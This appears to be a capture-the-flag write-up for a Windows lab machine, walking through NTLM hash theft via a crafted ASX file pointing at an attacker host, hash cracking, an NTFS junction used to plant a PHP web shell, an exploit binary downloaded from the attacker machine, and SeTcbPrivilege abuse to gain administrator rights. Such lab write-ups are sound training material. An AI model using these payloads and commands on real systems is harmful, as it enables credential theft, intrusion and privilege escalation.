### Service Discovery Analysis

The Nmap scan reveals three key services running on the target machine:

- **SSH (Port 22):** OpenSSH 9.5 for Windows, enabling remote command execution
- **HTTP (Port 80):** Apache 2.4.56 with PHP 8.1.17, hosting the ProMotion Studio web application
- **RDP (Port 3389):** Remote Desktop Protocol on Windows Server 2022 (Build 20348)

The machine hostname is MEDIA and is not part of an Active Directory domain (standalone workgroup). The time skew is minimal (-5 seconds), indicating accurate system time synchronization.

### Initial Web Application Discovery

Accessing the web application on port 80 reveals a file upload functionality. The application accepts file submissions for processing, displaying the message: "Your application was successfully submitted. Our HR shall review your video and get back to you."

This indicates that a human user will interact with uploaded files, creating an opportunity for credential theft through file type exploitation.

### Identifying the Target

The machine name "Media" and the Apache/PHP web server suggest this is running Windows Media-related software. This opens the possibility of uploading media file types such as `.asx` (Advanced Stream Redirector) or `.wax` (Windows Audio) files, which are processed by Windows Media Player and can trigger NTLM authentication attempts to remote resources.

## **User**

### NTLM Hash Capture via ASX File Exploitation

#### Step 1: Create Malicious ASX File

Create a specially crafted ASX playlist file that references a non-existent network resource. When processed by Windows Media Player, this will trigger an NTLM authentication attempt to the attacker's responder server.

```bash
## nano file.asx
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title>poc</title>
    <ref href="file:\\<attacker_ip>\share\file.wax"/>
  </entry>
</asx>
```

This ASX file contains a reference to a file share on the attacker's machine. When Windows Media Player attempts to access this share, it will automatically initiate NTLM authentication.

#### Step 2: Set Up Responder Listener

On the attacker's machine, configure responder to capture NTLM authentication attempts:

```bash
sudo responder -I tun0
```

#### Step 3: Upload Malicious File

Upload the crafted file.asx through the web application's file upload form. The application accepts the submission and notifies that the HR department will review the video.

After a few minutes, the user (likely from the HR department) opens the uploaded ASX file with Windows Media Player. The player attempts to access the referenced network share and sends NTLM credentials to the responder server.

![](/assets/img/media/Pasted_image_20260914151824.png)

**Result:** NTLM hash successfully captured from the domain user enox.

#### Step 4: Crack NTLM Hash

Use John the Ripper to crack the captured NTLM hash against the rockyou.txt wordlist:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Output:**

```
1234virus@       (enox)
```

**Credentials Obtained:**

- **Username:** enox
- **Password:** 1234virus@

#### Step 5: SSH Access

Establish SSH connection using the cracked credentials:

```bash
ssh enox@<target>
```

An interactive shell is established as the enox user. The user flag can be retrieved:

```bash
type C:\Users\enox\Desktop\user.txt
```

## **Root**

### Directory Traversal via NTFS Junction Attack

#### Step 1: Analyze Upload Directory Structure

Examining the index.php file at `C:\xampp\htdocs`, we discover that:

- Uploaded files are stored in `C:\Windows\Tasks\Uploads\`
- File directories are named using MD5 hash of the concatenated user first name, last name, and email
- The application automatically creates these directories when files are uploaded

![](/assets/img/media/Pasted_image_20260914153651.png)

When we uploaded our ASX file, the application created a directory named `90184acfb532bd180742f42375733a7d`, which is the MD5 hash of our submission data.

#### Step 2: Delete Original Upload Directory

From the enox PowerShell session, delete the previously created upload directory:

```powershell
del C:\Windows\Tasks\Uploads\90184acfb532bd180742f42375733a7d
```

#### Step 3: Create NTFS Junction

Create an NTFS junction (hard link) that points the upload directory to the web root directory. This will cause subsequent uploads to be written directly to the web-accessible directory:

```powershell
mklink /J "C:\Windows\Tasks\Uploads\90184acfb532bd180742f42375733a7d" "C:\xampp\htdocs"
```

This command creates a junction that redirects all writes intended for the Tasks\Uploads directory to the xampp\htdocs directory, effectively bypassing the upload directory and placing files directly in the web root.

#### Step 4: Upload Web Shell

Using the same submission data (which will generate the same MD5 hash), upload a PHP web shell through the file upload form:

```php
<?php system($_GET['cmd']); ?>
```

The application processes the upload, attempting to write the file to `C:\Windows\Tasks\Uploads\90184acfb532bd180742f42375733a7d\`, but due to the NTFS junction, the file is actually written to `C:\xampp\htdocs\`.

#### Step 5: Test Web Shell Access

Test the web shell functionality:

```bash
curl "http://<target>/shell.php?cmd=whoami"
```

### Privilege Escalation via SeTcbPrivilege

#### Step 1: Enumerate User Privileges

From the LOCAL SERVICE session obtained through the web shell, check available privileges:

```powershell
whoami /priv
```

![](/assets/img/media/Pasted_image_20260914163425.png)

**Critical Finding:** The SeTcbPrivilege (Act as part of the operating system) is enabled on the LOCAL SERVICE account. This is a dangerous privilege that allows elevation to SYSTEM level privileges.

#### Step 2: Obtain SeTcbPrivilege Exploitation Tool

Clone the SeTcbPrivilege abuse exploitation repository:

```bash
git clone https://github.com/b4lisong/SeTcbPrivilege-Abuse.git
```

#### Step 3: Set Up HTTP Server

Host the compiled exploitation tool via HTTP:

```bash
python3 -m http.server 9090
```

#### Step 4: Download Exploitation Tool

From the web shell or via the reverse shell, download the TcbElevation-x64.exe binary:

```powershell
Invoke-WebRequest http://<attacker_ip>:9090/TcbElevation-x64.exe -OutFile C:\Programdata\TcbElevation-x64.exe
```

#### Step 5: Enumerate Local Administrators

Check current membership of the Administrators group:

```powershell
net localgroup Administrators
```

![](/assets/img/media/Pasted_image_20260914163720.png)

**Finding:** Only the built-in Administrator account is currently a member.

#### Step 6: Exploit SeTcbPrivilege

Use the TcbElevation tool to execute a command with elevated privileges. Add the enox user to the Administrators group:

```powershell
C:\Programdata\TcbElevation-x64.exe elevate 'net localgroup Administrators enox /add'
```

![](/assets/img/media/Pasted_image_20260914163750.png)

#### Step 7: Verify Privilege Escalation

Confirm that enox has been successfully added to the Administrators group:

```powershell
net localgroup Administrators
```

![](/assets/img/media/Pasted_image_20260914163804.png)

**Result:** The enox user is now a member of the Administrators group.

#### Step 8: SSH Access as Administrator

Disconnect from the previous SSH session and establish a new connection. The enox user now has administrative privileges:

```bash
ssh enox@<target>
```

The elevated session now has full administrative rights. The root flag can be retrieved:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

![](/assets/img/media/Pasted_image_20260914163848.png)

### Attack Chain Summary

1. **Reconnaissance:** Identified web application with file upload functionality and Windows Media player integration
2. **NTLM Capture:** Created malicious ASX file referencing non-existent network share; configured responder listener; captured NTLM hash when user accessed uploaded file
3. **Credential Cracking:** Used John the Ripper to crack captured NTLM hash; obtained enox:1234virus@ credentials
4. **Initial Access:** Established SSH connection as enox user; obtained user flag
5. **Directory Traversal:** Analyzed upload directory structure; identified MD5-based directory naming scheme
6. **NTFS Junction Abuse:** Deleted original upload directory; created NTFS junction pointing to web root; uploaded PHP web shell
7. **Remote Code Execution:** Accessed web shell through web browser; achieved command execution as LOCAL SERVICE
8. **Privilege Escalation:** Identified SeTcbPrivilege on LOCAL SERVICE; downloaded and executed TcbElevation tool; added enox to Administrators group
9. **Administrator Access:** Connected via SSH with elevated privileges; obtained root flag
